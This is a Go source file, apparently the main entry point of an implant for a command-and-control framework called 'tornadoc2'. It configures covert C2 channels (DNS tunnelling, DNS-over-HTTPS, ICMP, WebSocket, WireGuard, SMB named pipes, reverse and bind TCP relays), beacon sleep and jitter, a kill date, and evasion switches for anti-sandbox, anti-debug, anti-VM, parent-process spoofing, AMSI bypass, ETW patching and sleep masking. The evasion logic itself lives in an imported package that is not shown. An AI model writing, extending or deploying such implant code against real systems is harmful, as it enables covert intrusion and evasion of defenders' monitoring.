package main

import (
	"os"
	"strconv"
	"strings"

	"tornadoc2/agent/core"
)

func main() {
	if ServerECDHPubkey == "" && os.Getenv("TORNADO_ALLOW_PLAINTEXT") == "" {
		println("[agent] ServerECDHPubkey is empty — this agent " +
			"will speak plaintext. Set TORNADO_ALLOW_PLAINTEXT=1 " +
			"to override.")
		os.Exit(1)
	}
	core.Main(core.Config{
		DefaultURL:      DefaultURL,
		DefaultProfile:  DefaultProfile,
		ServerPubKeyPem: ServerPubKeyPem,
		ClientCertPem:   ClientCertPem,
		ClientKeyPem:    ClientKeyPem,
		RootCAPem:       RootCAPem,
		ProfileJSON:     ProfileJSON,
		AgentPrivKeyPem: AgentPrivKeyPem,
		TransportMode:   TransportMode,
		DNSDomain:       DNSDomain,
		DNSResolver:     DNSResolver,
		ICMPHost:        ICMPHost,
		DoHResolver:   DoHResolver,
		DoHHostHeader: DoHHostHeader,
		DoHUserAgent:  DoHUserAgent,

		DNSVerbB:            DNSVerbB,
		DNSVerbT:            DNSVerbT,
		DNSVerbR:            DNSVerbR,
		DNSPayloadChunkSize: atoi(DNSPayloadChunkSize, 0),

		WebSocketURL: WebSocketURL,

		WireGuardServerPubKey: WireGuardServerPubKey,
		WireGuardServerAddr:   WireGuardServerAddr,
		WireGuardAgentPrivKey: WireGuardAgentPrivKey,
		WireGuardTunnelIP:     WireGuardTunnelIP,
		WireGuardServerTunnelIP: WireGuardServerTunnelIP,
		WireGuardInnerPort:    WireGuardInnerPort,

		SMBPipe:         SMBPipe,
		SMBRelayPipe:    SMBRelayPipe,

		TCPBindAddr:     TCPBindAddr,
		TCPBindToken:    TCPBindToken,
		TCPRelayTarget:  TCPRelayTarget,
		TCPRelayToken:   TCPRelayToken,

		TCPRevListen: TCPRevListen,
		TCPRevTarget: TCPRevTarget,
		TCPRevToken:  TCPRevToken,

		ServerECDHPubkey:    ServerECDHPubkey,
		ObfKeyHex:           ObfKeyHex,
		PivotPrivKeyB64:     PivotPrivKeyB64,
		PivotPubKeyB64:      PivotPubKeyB64,
		InjectMethod:        InjectMethodDefault,
		TLSProfile:          TLSProfile,
		SleepMaskType:    SleepMaskType,
		SyscallMethod:    SyscallMethod,

		TransportFailoverAfter: atoi(TransportFailoverAfterRaw, 3),
		KillDays:               atoi(KillDaysRaw, 30),
		DefaultSleepSeconds:    atoi(DefaultSleepSecondsRaw, 60),
		DefaultJitter:          atof(DefaultJitterRaw, 0.3),
		WorkHoursStart:         clock(WorkHoursStartRaw, 480),
		WorkHoursEnd:           clock(WorkHoursEndRaw, 1140),

		AntiSandbox:       truthy(AntiSandboxEnabledRaw),
		AntiDebug:         truthy(AntiDebugRaw),
		AntiVM:            truthy(AntiVmRaw),
		PpidSpoof:         truthy(PpidSpoofRaw),
		AmsiBypass:        truthy(AmsiBypassRaw),
		EtwPatch:          truthy(EtwPatchRaw),
		SleepMask:         truthy(SleepMaskEnabledRaw),
		StringObfuscation: truthy(StringObfuscationRaw),
		Verbose:           truthy(VerboseRaw),
	})
}

func atoi(s string, def int) int {
	if v, err := strconv.Atoi(s); err == nil {
		return v
	}
	return def
}

func truthy(s string) bool {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "true", "1", "yes", "on":
		return true
	}
	return false
}

func atof(s string, def float64) float64 {
	if v, err := strconv.ParseFloat(s, 64); err == nil {
		return v
	}
	return def
}

func clock(s string, def int) int {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "off", "disable", "none", "":
		return 0
	}
	if v, ok := core.ParseClock(s); ok {
		return v
	}
	return def
}